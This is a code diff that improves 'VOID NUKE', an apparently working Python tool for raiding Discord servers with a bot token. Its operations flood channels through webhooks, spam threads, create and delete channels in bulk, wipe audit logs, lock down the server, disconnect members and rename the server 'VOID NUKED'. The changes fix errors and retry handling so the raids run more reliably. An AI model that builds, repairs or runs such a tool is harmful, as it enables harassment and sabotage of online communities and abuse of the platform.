@@ -32,7 +32,7 @@ console = Console(highlight=False)
 # ── Token ─────────────────────────────────────────────────────────────────────
 BASE_URL   = "https://discord.com/api/v10"
 TOKEN      = ""          # loaded/set at runtime via _load_token() / _set_token()
-TOKEN_FILE = "token.txt" # saved here so you don't re-enter every run
+TOKEN_FILE = "tokens.txt" # saved here so you don't re-enter every run
 
 HDRS: dict = {
     "Content-Type": "application/json",
@@ -50,7 +50,7 @@ def _set_token(raw: str) -> None:
     HDRS["Authorization"] = f"Bot {TOKEN}"
 
 def _load_token() -> bool:
-    """Load token from token.txt. Returns True if a non-empty token was found."""
+    """Load token from tokens.txt. Returns True if a non-empty token was found."""
     try:
         import os
         raw = open(TOKEN_FILE).read().strip()
@@ -157,7 +157,7 @@ class RateLimiter:
         reset_aft = h.get("X-RateLimit-Reset-After")
         if h.get("X-RateLimit-Global") == "true" and reset_aft:
             self._global_ready.clear()
-            asyncio.get_event_loop().call_later(float(reset_aft), self._global_ready.set)
+            asyncio.get_running_loop().call_later(float(reset_aft), self._global_ready.set)
         if bucket:
             self._route_bucket[path] = bucket
             if remaining is not None: self._remaining[bucket] = int(remaining)
@@ -191,19 +191,22 @@ async def _req(method: str, path: str, json: dict = None, retries: int = 12):
         try:
             async with _SESSION.request(method, url, headers=HDRS, json=json) as resp:
                 RL.update(path, resp)
-                if resp.status == 204:   ST.ok();   return {}
+                if resp.status == 204:                ST.ok();   return {}
                 if resp.status == 429:
                     data = await resp.json(content_type=None)
-                    await RL.handle_429(resp, data); continue
-                if resp.status in (200, 201): ST.ok(); return await resp.json(content_type=None)
-                if resp.status in (400, 403, 404, 401): ST.fail(); return None
-                await asyncio.sleep(min(0.4 * (attempt + 1), 3.0))
-        except (aiohttp.ClientError, asyncio.TimeoutError): await asyncio.sleep(0.2)
-        except Exception: await asyncio.sleep(0.3)
+                    await RL.handle_429(resp, data);  continue
+                if resp.status in (200, 201):         ST.ok(); return await resp.json(content_type=None)
+                if resp.status in (400, 401, 403, 404): ST.fail(); return None
+                # 5xx / unexpected — back off and retry
+                await asyncio.sleep(min(0.5 * (attempt + 1), 5.0))
+        except (aiohttp.ClientError, asyncio.TimeoutError):
+            await asyncio.sleep(0.3 * (attempt + 1))
+        except Exception:
+            await asyncio.sleep(0.3)
     ST.fail(); return None
 
 async def _req_wh(url: str, content: str, retries: int = 8) -> bool:
-    for _ in range(retries):
+    for attempt in range(retries):
         try:
             async with _SESSION.post(url, json={"content": content},
                                      headers={"Content-Type":"application/json"}) as r:
@@ -211,8 +214,11 @@ async def _req_wh(url: str, content: str, retries: int = 8) -> bool:
                 if r.status == 429:
                     d = await r.json(content_type=None)
                     await asyncio.sleep(float(d.get("retry_after", 1.0))); continue
+                # permanent failure — webhook gone or forbidden, stop retrying this URL
                 if r.status in (400, 401, 403, 404): ST.fail(); return False
-        except Exception: await asyncio.sleep(0.2)
+                await asyncio.sleep(0.3 * (attempt + 1))
+        except Exception:
+            await asyncio.sleep(0.2)
     ST.fail(); return False
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -296,7 +302,10 @@ async def _flood_via_webhooks(channels: list, msg: str,
 
     async def _fire(url: str):
         for _ in range(rounds):
-            await _req_wh(url, msg)
+            ok = await _req_wh(url, msg)
+            if not ok:
+                # permanent failure (404/403) — webhook is dead, skip remaining rounds
+                break
             await asyncio.sleep(0.05)
 
     with Live(console=console, refresh_per_second=4, transient=True) as live:
@@ -305,8 +314,7 @@ async def _flood_via_webhooks(channels: list, msg: str,
             live.update(_progress_panel("WEBHOOK FLOOD", "bright_red"))
             await asyncio.sleep(0.25)
         live.update(_progress_panel("WEBHOOK FLOOD", "bright_red"))
-    await asyncio.gather(*tasks, return_exceptions=True)
-    await asyncio.gather(*tasks, return_exceptions=True)
+    await asyncio.gather(*tasks, return_exceptions=True)   # collect any exceptions once
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # API HELPERS
@@ -325,6 +333,8 @@ async def api_members(gid):
         if len(chunk) < 1000: break
         after = chunk[-1]["user"]["id"]
     return out
+
+async def api_emojis(gid):         return await _req("GET", f"/guilds/{gid}/emojis")  or []
 
 async def api_app_id():
     me = await api_self()
@@ -399,8 +409,9 @@ async def disc_m(gid, uid):        return await _req("PATCH",  f"/guilds/{gid}/m
 async def mk_channel(gid, name, t=0):
     return await _req("POST", f"/guilds/{gid}/channels", json={"name":name,"type":t})
 async def mk_thread(cid, name):
+    # type 11 = public thread (works on all servers; type 12 = private, needs Nitro boost lvl 2)
     return await _req("POST", f"/channels/{cid}/threads",
-                      json={"name":name,"auto_archive_duration":60,"type":12})
+                      json={"name":name,"auto_archive_duration":60,"type":11})
 async def mk_webhook(cid, name="void"):
     return await _req("POST", f"/channels/{cid}/webhooks", json={"name":name})
 async def ch_perms(cid, oid, allow, deny):
@@ -461,25 +472,22 @@ def _menu(me_name: str, me_id: str, guild_id: str | None):
         console.print(f"  [dim]No server selected. Type[/] [bold white]S[/] "
                       f"[dim]to set a Server ID.[/]\n")
 
-    # Print all 21 ops in two-column rows, no section headers
-    items = MENU_ITEMS   # list of tuples: (key, label, ...)
+    # Print all 21 ops in two-column rows — labels only, no descriptions
+    items = MENU_ITEMS
     for i in range(0, len(items), 2):
         left_item  = items[i]
         right_item = items[i + 1] if i + 1 < len(items) else None
         k1, l1 = left_item[0], left_item[1]
-        d1 = MENU_DESCS.get(k1, "")
-        left = f"  [dim]>[/] [[{TEAL}]{k1:>2}[/]] [{WHITE}]{l1:<16}[/]  [{DIM}]{d1:<38}[/]"
+        left = f"  [dim]>[/] [[{TEAL}]{k1:>2}[/]] [{WHITE}]{l1}[/]"
         if right_item:
             k2, l2 = right_item[0], right_item[1]
-            d2 = MENU_DESCS.get(k2, "")
-            right = f"  [dim]>[/] [[{TEAL}]{k2:>2}[/]] [{WHITE}]{l2:<16}[/]  [{DIM}]{d2}[/]"
+            right = f"   [dim]>[/] [[{TEAL}]{k2:>2}[/]] [{WHITE}]{l2}[/]"
             console.print(left + right)
         else:
             console.print(left)
 
     console.print()
-    console.print(f"  [dim]  R   Reload Bot[/]  "
-                  f"[dim]│[/]  [dim]  0   Exit[/]")
+    console.print(f"  [dim]  R   Reload Bot   │   0   Exit[/]")
     console.print()
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -609,13 +617,21 @@ async def op_lockdown(gid, _=None):
 
 async def op_ghost(gid, _=None):
     _status("Running ghost loop (100 cycles)…")
+    ST.set_total(100)
     async def _cycle():
-        ch = await mk_channel(gid, "\u200b")
+        ch = await mk_channel(gid, "void")   # \u200b rejected by Discord (400); use valid name
         if ch and ch.get("id"):
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.4)
             await del_channel(ch["id"])
-    await _pool([_cycle() for _ in range(100)], n_workers=20)
-    _ok("Ghost loop done")
+        ST.ok()
+    with Live(console=console, refresh_per_second=4, transient=True) as live:
+        tasks = [asyncio.create_task(_cycle()) for _ in range(100)]
+        while any(not t.done() for t in tasks):
+            live.update(_progress_panel("GHOST MODE", "bright_cyan"))
+            await asyncio.sleep(0.25)
+        live.update(_progress_panel("GHOST MODE", "bright_cyan"))
+    await asyncio.gather(*tasks, return_exceptions=True)
+    _ok(f"Ghost loop done — {ST.done} cycles")
 
 async def op_thread_raid(gid, _=None):
     channels = await api_channels(gid)
@@ -643,7 +659,12 @@ async def op_audit_wipe(gid, _=None):
 
 async def op_rename_server(gid, extra=None):
     name = extra or "☢ VOID NUKED ☢"
-    await edit_guild(gid, name=name)
+    ST.set_total(1)
+    with Live(console=console, refresh_per_second=4, transient=True) as live:
+        live.update(_progress_panel("RENAME SERVER", "bright_yellow"))
+        await edit_guild(gid, name=name)
+        ST.done = 1
+        live.update(_progress_panel("RENAME SERVER", "bright_yellow"))
     _ok(f"Server renamed → {name}")
 
 async def op_webhook_spam(gid, _=None):
@@ -698,7 +719,12 @@ async def op_disc_all(gid, _=None):
     _ok(f"Disconnected {ST.done}")
 
 async def op_server_info(gid, _=None):
-    g, chs, roles = await asyncio.gather(api_guild(gid), api_channels(gid), api_roles(gid))
+    ST.set_total(3)
+    with Live(console=console, refresh_per_second=4, transient=True) as live:
+        live.update(_progress_panel("FETCHING SERVER INFO", "bright_white"))
+        g = await api_guild(gid);   ST.done = 1; live.update(_progress_panel("FETCHING SERVER INFO", "bright_white"))
+        chs = await api_channels(gid); ST.done = 2; live.update(_progress_panel("FETCHING SERVER INFO", "bright_white"))
+        roles = await api_roles(gid);  ST.done = 3; live.update(_progress_panel("FETCHING SERVER INFO", "bright_white"))
     if not g: _fail("Cannot fetch guild"); return
     t = Table.grid(padding=(0,3))
     t.add_column(style="dim"); t.add_column(style="bold white")
@@ -714,20 +740,24 @@ async def op_server_info(gid, _=None):
                         border_style=YELLOW, box=box.DOUBLE_EDGE))
 
 async def op_user_info(gid, extra=None):
-    uid  = extra or input("  User ID: ").strip()
-    user = await _req("GET", f"/users/{uid}")
+    uid = extra or input("  User ID: ").strip()
+    ST.set_total(2)
+    with Live(console=console, refresh_per_second=4, transient=True) as live:
+        live.update(_progress_panel("FETCHING USER INFO", "bright_white"))
+        user = await _req("GET", f"/users/{uid}"); ST.done = 1
+        live.update(_progress_panel("FETCHING USER INFO", "bright_white"))
+        m = (await _req("GET", f"/guilds/{gid}/members/{uid}")) if gid else None
+        ST.done = 2; live.update(_progress_panel("FETCHING USER INFO", "bright_white"))
     if not user: _fail("Cannot fetch user"); return
     t = Table.grid(padding=(0,3))
     t.add_column(style="dim"); t.add_column(style="bold white")
     t.add_row("Username", f"{user.get('username','?')}#{user.get('discriminator','0')}")
     t.add_row("ID",       str(user.get("id","?")))
     t.add_row("Bot",      str(user.get("bot", False)))
-    if gid:
-        m = await _req("GET", f"/guilds/{gid}/members/{uid}")
-        if m:
-            t.add_row("Nickname", m.get("nick") or "—")
-            t.add_row("Joined",   m.get("joined_at","?")[:10])
-            t.add_row("Roles",    str(len(m.get("roles",[]))))
+    if m:
+        t.add_row("Nickname", m.get("nick") or "—")
+        t.add_row("Joined",   m.get("joined_at","?")[:10])
+        t.add_row("Roles",    str(len(m.get("roles",[]))))
     console.print(Panel(t, title=f"[bold {TEAL}]  USER INFO  [/]",
                         border_style=TEAL, box=box.DOUBLE_EDGE))
 
@@ -984,10 +1014,6 @@ async def main():
                         _warn("No ID entered — server unchanged.")
                 except (EOFError, KeyboardInterrupt):
                     pass
-                try:
-                    input("\n  Press Enter to return to the menu…")
-                except (EOFError, KeyboardInterrupt):
-                    break
                 continue
 
             # R — reload bot / re-auth
@@ -998,11 +1024,6 @@ async def main():
                 _sep(RED)
                 console.print()
                 guild_id = await op_reload_bot(guild_id)
-                console.print()
-                try:
-                    input("  Press Enter to return to the menu…")
-                except (EOFError, KeyboardInterrupt):
-                    break
                 continue
 
             # Normalise zero-padded input (01 → 1)
@@ -1012,15 +1033,8 @@ async def main():
                 await asyncio.sleep(0.5)
                 continue
 
-            # ── Run the chosen operation ──────────────────────────────────────
+            # ── Run the chosen operation — auto-returns to menu when done ─────
             guild_id = await _dispatch(raw if raw in OPERATIONS else norm, guild_id)
-
-            # ── Always return to menu ─────────────────────────────────────────
-            console.print()
-            try:
-                input("  Press Enter to return to the menu…")
-            except (EOFError, KeyboardInterrupt):
-                break
 
     finally:
         try: await _SESSION.close()
@@ -1045,7 +1059,7 @@ def run():
         console.print(f"  [green]  ✓  VOID NUKE exited cleanly[/]")
         console.print(f"  [red]{'◈' * (w - 4)}[/]")
         console.print()
-        console.print("  Press Enter to return to the menu…", end="")
+        pass
 
 if __name__ == "__main__":
     run()
